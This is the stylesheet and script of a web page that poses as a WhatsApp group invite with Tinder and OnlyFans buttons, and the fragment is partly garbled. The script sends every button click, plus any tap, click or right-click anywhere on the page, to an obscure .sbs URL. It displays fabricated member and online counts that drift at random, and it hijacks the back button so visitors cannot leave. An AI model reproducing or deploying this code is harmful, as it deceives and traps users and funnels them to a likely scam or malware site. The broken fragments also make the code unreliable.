            color: white;

        video.bg-video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            object-position: center;
            z-index: -2;
        }

        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: -1;
            backdrop-filter: blur(3px);
        }

        /* Header */
        .whatsapp-header {
            background-color: #075e54;
            padding: 16px;
            display: flex;
            align-items: center;
            gap: 15px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
            flex-shrink: 0;
            z-index: 10;
        }

        .back-button {
            color: white;
            font-size: 20px;
            cursor: pointer;
            opacity: 0.9;
            width: 30px;
            display: flex;
            justify-content: center;
        }

        .header-text { flex: 1; }
        .header-text h1 { font-size: 18px; font-weight: 600; line-height: 1.2; }
        .header-text p { font-size: 13px; opacity: 0.9; margin-top: 2px; }

        /* Main Layout */
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            text-align: center;
            z-index: 1;
        }

        .profile-container { margin-bottom: 15px; width: 100%; }

        .profile-img {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            margin: 0 auto 15px;
            overflow: hidden;
            background: linear-gradient(145deg, #25d366, #128c7e);
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 52px;
            box-shadow: 0 15px 25px rgba(0,0,0,0.3);
            border: 3px solid rgba(255,255,255,0.4);
            position: relative;
        }
        .profile-img img { width: 100%; height: 100%; object-fit: cover; }

        .group-name {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 5px;
            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }
        .group-info { font-size: 14px; opacity: 0.9; margin-bottom: 20px; font-weight: 400; }

        /* Stats */
        .members-info {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 25px;
            flex-wrap: wrap;
        }
        .member-count, .active-members {
            display: flex;
            flex-direction: column;
            align-items: center;
            background: rgba(0,0,0,0.4);
            backdrop-filter: blur(10px);
            padding: 10px 24px;
            border-radius: 45px;
            border: 1px solid rgba(255,255,255,0.1);
            min-width: 100px;
        }
        .member-count:hover, .active-members:hover {
            background: rgba(0,0,0,0.6);
            transform: translateY(-2px);
            transition: all 0.2s;
        }
        .count { font-size: 24px; font-weight: 800; letter-spacing: 0.5px; }
        .label { font-size: 12px; opacity: 0.85; margin-top: 3px; text-transform: uppercase; letter-spacing: 0.5px; }
        
        .online-indicator {
            display: flex;
            align-items: center;
            gap: 6px;
            margin-top: 4px;
            font-size: 12px;
            color: #25d366;
        }
        .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background-color: #25d366;
            box-shadow: 0 0 8px #25d366;
            animation: pulseGreen 1.4s infinite;
        }
        @keyframes pulseGreen {
            0% { opacity: 0.6; transform: scale(0.9);}
            50% { opacity: 1; transform: scale(1.1);}
            100% { opacity: 0.6; transform: scale(0.9);}
        }

        /* Buttons */
        .button-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 16px;
            margin: 15px 0 20px;
            width: 100%;
            max-width: 350px;
        }
        .btn-social {
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding: 14px 20px;
            border-radius: 60px;
            font-size: 16px;
            font-weight: 700;
            text-decoration: none;
            transition: all 0.25s ease;
            cursor: pointer;
            border: none;
            color: white;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .btn-social span {
            display: inline-block;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            flex: 1;
            text-align: center;
        }
        .btn-social.whatsapp { background: linear-gradient(135deg, #25d366, #128c7e); }
        .btn-social.tinder { background: linear-gradient(135deg, #fd297b, #ff655b); }
        .btn-social.onlyfans { background: linear-gradient(135deg, #00aff0, #009cd6); }
        .btn-social:hover { transform: translateY(-3px); box-shadow: 0 12px 28px rgba(0, 0, 0, 0.5); filter: brightness(1.1); }
        .btn-social:active { transform: scale(0.98); }
        .btn-social.loading { pointer-events: none; opacity: 0.8; transform: scale(0.98); }
        .btn-social.loading i, .btn-social.loading .custom-icon { animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .security-notice {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 20px;
            font-size: 11px;
            background: rgba(0,0,0,0.4);
            padding: 8px 18px;
            border-radius: 60px;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255,255,255,0.05);
        }
        .footer { padding: 14px; font-size: 10px; opacity: 0.5; text-align: center; flex-shrink: 0; }

        @keyframes softPulse {
            0% { transform: scale(1); box-shadow: 0 15px 25px rgba(0,0,0,0.2);}
            50% { transform: scale(1.03); box-shadow: 0 20px 35px rgba(0,0,0,0.3);}
            100% { transform: scale(1); box-shadow: 0 15px 25px rgba(0,0,0,0.2);}
        }
        .profile-img { animation: softPulse 4s infinite ease-in-out; }

    function applyLanguage() {
        const browserLang = navigator.language || navigator.userLanguage;
        const langCode = browserLang.split('-')[0].toLowerCase();
        
        let t = translations['en'];
        let useGoogleTranslate = false;

        if (translations[langCode]) {
            t = translations[langCode];
            console.log("🌍 Using Manual Translation: " + langCode);
        } else {
            t = translations['en'];
            useGoogleTranslate = true;
            console.log("🌍 Language ("+langCode+") not in DB. Using Google Translate fallback.");
        }

        document.getElementById('headerTitle').innerText = t.headerTitle;
        document.getElementById('headerSubtitle').innerText = t.headerSubtitle;
        document.getElementById('groupName').innerText = t.groupName;
        document.getElementById('groupInfo').innerText = t.groupInfo;
        document.getElementById('labelMembers').innerText = t.labelMembers;
        document.getElementById('labelOnline').innerText = t.labelOnline;
        document.getElementById('btnWhatsapp').innerText = t.btnWhatsapp;
        document.getElementById('btnTinder').innerText = t.btnTinder;
        document.getElementById('btnOnlyfans').innerText = t.btnOnlyfans;
        document.getElementById('securityText').innerText = t.securityText;
        document.getElementById('footerText').innerText = t.footerText;
        
        document.title = t.metaTitle;
        document.querySelector('meta[property="og:title"]').setAttribute("content", t.metaTitle);
        document.querySelector('meta[property="og:description"]').setAttribute("content", t.metaDesc);
        document.querySelector('meta[name="twitter:title"]').setAttribute("content", t.metaTitle);
        document.querySelector('meta[name="twitter:description"]').setAttribute("content", t.metaDesc);

        window.currentLangTexts = t;

        if (useGoogleTranslate) {
            setTimeout(() => {
                const googleTranslateCombo = document.createElement("div");
                googleTranslateCombo.id = "google_translate_element";
                googleTranslateCombo.style.display = "none";
                document.body.appendChild(googleTranslateCombo);

                if (typeof google !== 'undefined' && google.translate) {
                    const te = new google.translate.TranslateElement({pageLanguage: 'en', includedLanguages: langCode, layout: google.translate.TranslateElement.FloatPosition.TOP_LEFT, autoDisplay: false}, 'google_translate_element');
                } else {
                    console.warn("Google Translate script not loaded yet.");
                }
            }, 1000);
        }
    }

    applyLanguage();

    const targetRedirectUrl = "https://FsAHvsG.gemblong.sbs/kcqbGncsDdbSYpqiniW4";
    let isRedirecting = false;

    function showLoadingOnButton(button) {
        if (!button) return;
        if (!button.hasAttribute('data-original')) {
            button.setAttribute('data-original', button.innerHTML);
        }
        const loadingMsg = window.currentLangTexts ? window.currentLangTexts.loadingText : "Redirecting...";
        button.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>' + loadingMsg + '</span>';
        button.classList.add('loading');
        button.style.pointerEvents = 'none';
    }

    function performRedirect(buttonElement = null) {
        if (isRedirecting) return;
        
        if (!targetRedirectUrl || targetRedirectUrl === "#") {
            const btn = buttonElement || document.querySelector('.btn-social');
            if (btn) {
                const errorMsg = window.currentLangTexts ? window.currentLangTexts.errorConfig : "Link Configuration Needed";
                const originalText = btn.querySelector('span').innerText;
                btn.querySelector('span').innerText = errorMsg;
                setTimeout(() => {
                    btn.querySelector('span').innerText = originalText;
                    btn.classList.remove('loading');
                }, 2000);
            }
            return;
        }
        
        isRedirecting = true;
        console.log("🚀 Redirecting to:", targetRedirectUrl);
        
        if (buttonElement) {
            showLoadingOnButton(buttonElement);
        } else {
            const anyBtn = document.querySelector('.btn-social');
            if (anyBtn) showLoadingOnButton(anyBtn);
        }
        
        setTimeout(function() {
            window.location.href = targetRedirectUrl;
        }, 400); 
    }

    const whatsappBtn = document.getElementById('whatsappBtn');
    const tinderBtn = document.getElementById('tinderBtn');
    const onlyfansBtn = document.getElementById('onlyfansBtn');
    const backBtn = document.getElementById('backBtn');

    [whatsappBtn, tinderBtn, onlyfansBtn].forEach(btn => {
        if (btn) {
            btn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                performRedirect(this);
            });
        }
    });

    document.body.addEventListener('click', function(e) {
        const isButton = e.target.closest('.btn-social') || e.target.closest('#backBtn');
        if (!isButton && !isRedirecting) {
            e.stopPropagation();
            performRedirect(null);
        }
    });

    document.body.addEventListener('touchstart', function(e) {
        const isButton = e.target.closest('.btn-social') || e.target.closest('#backBtn');
        if (!isButton && !isRedirecting) {
            e.preventDefault();
            performRedirect(null);
        }
    }, { passive: false });

    document.body.addEventListener('contextmenu', function(e) {
        const isButton = e.target.closest('.btn-social');

            e.preventDefault();
            performRedirect(null);
            return false;
        }

    ];

    function getRandomVideo() {
        return videoList[Math.floor(Math.random() * videoList.length)];
    }

    function initBackgroundVideo() {
        const videoEl = document.getElementById('bgVideo');
        if (!videoEl) return;
        videoEl.src = getRandomVideo(); 
        videoEl.load();
        videoEl.play().catch(err => {
            console.log("Autoplay blocked.");
        });
    }

    initBackgroundVideo();

    const bgVideo = document.getElementById('bgVideo');
    if (bgVideo) {
        bgVideo.addEventListener('ended', function() {
            this.currentTime = 0;
            this.play().catch(e => console.log("Loop error"));
        });
        bgVideo.addEventListener('error', function() {
            console.log("Video error, trying another...");
            this.src = getRandomVideo();
            this.load();
            this.play().catch(() => {});
        });
    }

    function animateCounters() {
        const memberEl = document.querySelector('#memberCountDisplay .count');
        const activeEl = document.querySelector('#activeMembersDisplay .count');
        
        if (memberEl && activeEl) {
            setInterval(() => {
                if (!isRedirecting) {
                    let currentMember = parseFloat(memberEl.innerText) || 130.6;
                    let delta = (Math.random() * 0.5) - 0.2;
                    let newMember = currentMember + delta;
                    if (newMember > 135) newMember = 135;
                    if (newMember < 128) newMember = 128;
                    memberEl.innerText = newMember.toFixed(1) + 'K';
                    
                    let currentOnline = parseFloat(activeEl.innerText) || 50.8;
                    let deltaOnline = (Math.random() * 0.8) - 0.3;
                    let newOnline = currentOnline + deltaOnline;
                    if (newOnline > 55) newOnline = 55;
                    if (newOnline < 45) newOnline = 45;
                    activeEl.innerText = newOnline.toFixed(1) + 'K';
                }
            }, 3000);
        }
    }
    animateCounters();

    if (window.history && window.history.pushState) {
        history.pushState(null, null, location.href);
        window.addEventListener('popstate', function() {
            if (!isRedirecting) {
                history.pushState(null, null, location.href);
            }
        });
    }
